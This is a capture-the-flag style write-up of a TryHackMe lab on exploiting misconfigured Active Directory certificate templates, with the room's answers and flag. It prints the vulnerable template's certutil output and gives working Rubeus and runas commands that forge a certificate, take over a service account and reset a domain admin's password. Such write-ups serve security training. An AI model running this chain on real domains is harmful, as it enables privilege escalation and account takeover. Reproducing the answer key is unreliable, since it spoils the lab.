---
title: AD Certificate Templates
author: CYB3RM3
name: CYB3RM3 | AD Certificate Templates
date: 2022-03-02 13:37:19 +0100
categories: [TryHackMe, AD]
tags: [AD, Certificate, Misconfiguration]
---

Walkthrough on the exploitation of misconfigured AD certificate templates

THM Room [https://tryhackme.com/room/adcertificatetemplates](https://tryhackme.com/room/adcertificatetemplates)



## TASK 1 : Introduction
### Read the above
No Answer

## TASK 2 : A brief look at certificate templates
### Read the above

No Answer

### What does the user create to ask the CA for a certificate?
Answer : Certificate Signing Request

### What is the name of Microsoft's PKI implementation?
Answer : Active Directory Certificate Services

## TASK 3 : Certificate template enumeration

### What AD group will allow all AD user accounts to request a certificate?

![AD Common Groups](/images/thm/adcertificatetemplates/adcertificatetemplates_1.png)
_AD Common Groups_

Answer : Domain Users

### What AD group will allow all domain-joined computers to request a certificate?

Answer : Domain Computers

### Which EKU allows us to use the generated certificate for Kerberos authentication?

![EKU](/images/thm/adcertificatetemplates/adcertificatetemplates_2.png)
_EKU_

Answer : Client Authentication


### Which certificate template is misconfigured based on the three provided parameters?

[Certutil result]({% link images/thm/adcertificatetemplates/certutil.txt %})
[Param1 sorting]({% link images/thm/adcertificatetemplates/param1.txt %})
[Param2 sorting]({% link images/thm/adcertificatetemplates/param2.txt %})
[Param3 sorting]({% link images/thm/adcertificatetemplates/param3.txt %})

Applying the given method i found that Template[31] is misconfigured :

```console
Template[31]:
  TemplatePropCommonName = UserRequest
  TemplatePropFriendlyName = User Request
  TemplatePropEKUs =
3 ObjectIds:
    1.3.6.1.5.5.7.3.2 Client Authentication
    1.3.6.1.5.5.7.3.4 Secure Email
    1.3.6.1.4.1.311.10.3.4 Encrypting File System

  TemplatePropCryptoProviders =
    0: Microsoft Enhanced Cryptographic Provider v1.0

  TemplatePropMajorRevision = 64 (100)
  TemplatePropDescription = User
  TemplatePropSchemaVersion = 2
  TemplatePropMinorRevision = a (10)
  TemplatePropRASignatureCount = 0
  TemplatePropMinimumKeySize = 800 (2048)
  TemplatePropOID =
    1.3.6.1.4.1.311.21.8.13251815.15344444.12602244.3735211.11040971.202.13950390.3651808 User Request

  TemplatePropV1ApplicationPolicy =
3 ObjectIds:
    1.3.6.1.5.5.7.3.2 Client Authentication
    1.3.6.1.5.5.7.3.4 Secure Email
    1.3.6.1.4.1.311.10.3.4 Encrypting File System

  TemplatePropEnrollmentFlags = 19 (25)
    CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS -- 1
    CT_FLAG_PUBLISH_TO_DS -- 8
    CT_FLAG_AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE -- 10 (16)

  TemplatePropSubjectNameFlags = 1
    CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1

  TemplatePropPrivateKeyFlags = 1010010 (16842768)
    CTPRIVATEKEY_FLAG_EXPORTABLE_KEY -- 10 (16)
    CTPRIVATEKEY_FLAG_ATTEST_NONE -- 0
    TEMPLATE_SERVER_VER_2003<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 10000 (65536)
    TEMPLATE_CLIENT_VER_XP<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 1000000 (16777216)

  TemplatePropGeneralFlags = 2023a (131642)
    CT_FLAG_ADD_EMAIL -- 2
    CT_FLAG_PUBLISH_TO_DS -- 8
    CT_FLAG_EXPORTABLE_KEY -- 10 (16)
    CT_FLAG_AUTO_ENROLLMENT -- 20 (32)
    CT_FLAG_ADD_TEMPLATE_NAME -- 200 (512)
    CT_FLAG_IS_MODIFIED -- 20000 (131072)

  TemplatePropSecurityDescriptor = O:LAG:S-1-5-21-3330634377-1326264276-632209373-519D:PAI(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;DA)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;DU)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;S-1-5-21-3330634377-1326264276-632209373-519)(OA;;CR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;AU)(OA;;CR;a05b8cc2-17bc-4802-a710-e7c15ab866a2;;AU)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;DA)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;S-1-5-21-3330634377-1326264276-632209373-519)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;LA)(A;;LCRPLORC;;;AU)

    Allow Enroll	LUNAR\Domain Admins
    Allow Enroll	LUNAR\Domain Users
    Allow Enroll	LUNAR\Enterprise Admins
    Allow Enroll	NT AUTHORITY\Authenticated Users
    Allow Auto-Enroll	NT AUTHORITY\Authenticated Users
    Allow Full Control	LUNAR\Domain Admins
    Allow Full Control	LUNAR\Enterprise Admins
    Allow Full Control	LUNAR\Administrator
    Allow Read	NT AUTHORITY\Authenticated Users


  TemplatePropExtensions =
4 Extensions:

  Extension[0]:
    1.3.6.1.4.1.311.21.7: Flags = 0, Length = 31
    Certificate Template Information
        Template=User Request(1.3.6.1.4.1.311.21.8.13251815.15344444.12602244.3735211.11040971.202.13950390.3651808)
        Major Version Number=100
        Minor Version Number=10

  Extension[1]:
    2.5.29.37: Flags = 0, Length = 22
    Enhanced Key Usage
        Client Authentication (1.3.6.1.5.5.7.3.2)
        Secure Email (1.3.6.1.5.5.7.3.4)
        Encrypting File System (1.3.6.1.4.1.311.10.3.4)

  Extension[2]:
    2.5.29.15: Flags = 1(Critical), Length = 4
    Key Usage
        Digital Signature, Key Encipherment (a0)

  Extension[3]:
    1.3.6.1.4.1.311.21.10: Flags = 0, Length = 28
    Application Policies
        [1]Application Certificate Policy:
             Policy Identifier=Client Authentication
        [2]Application Certificate Policy:
             Policy Identifier=Secure Email
        [3]Application Certificate Policy:
             Policy Identifier=Encrypting File System

  TemplatePropValidityPeriod = 1 Years
  TemplatePropRenewalPeriod = 6 Weeks
```
{: .nolineno }

Answer : User Request

## TASK 4 : Generating a malicious certificate
### In which field do we inject the User Principal Name of the account we want to impersonate?

![Subject Alternative Name](/images/thm/adcertificatetemplates/adcertificatetemplates_3.png)
_Subject Alternative Name_

Answer : Subject Alternative Name

### If we had administrative access, when adding the snap-in, which option would we select to use the machine account of the host instead of our authenticated AD account for certificate generation?

![Computer Account](/images/thm/adcertificatetemplates/adcertificatetemplates_4.png)
_Computer Account_

Answer : Computer Account

### Follow the steps above and generate your very own privilege escalation certificate

No Answer.

## TASK 5 : User impersonation through a certificate

### What is the value of the flag stored on the Administrator's Desktop?

Generate the TGT :

```console
.\Rubeus.exe asktgt /user:svc.gitlab /enctype:aes256 /certificate:vulncert.pfx /password:test /outfile:svc.gitlab.kirbi /domain:lunar.eruca.com /dc:10.10.242.42
```
{: .nolineno }

Change the password of an admin user :

```console
.\Rubeus.exe changepw /ticket:svc.gitlab.kirbi /new:Hello!123 /dc:LUNDC.lunar.eruca.com /targetuser:lunar.eruca.com\da-sshepherd
```
{: .nolineno }

Then launched a command prompt as this user (password required) :

```console
runas /user:lunar.eruca.com\da-sshepherd cmd.exe
```
{: .nolineno }

Then navigated to the flag :

![Flag](/images/thm/adcertificatetemplates/adcertificatetemplates_5.png)
_Flag_

Answer : THM{AD.Certs.Can.Get.You.DA}

## TASK 6 : Mitigations and Fixes
### Read the above

No Answer.

## TASK 7 : Conclusion
### Read the above

No Answer.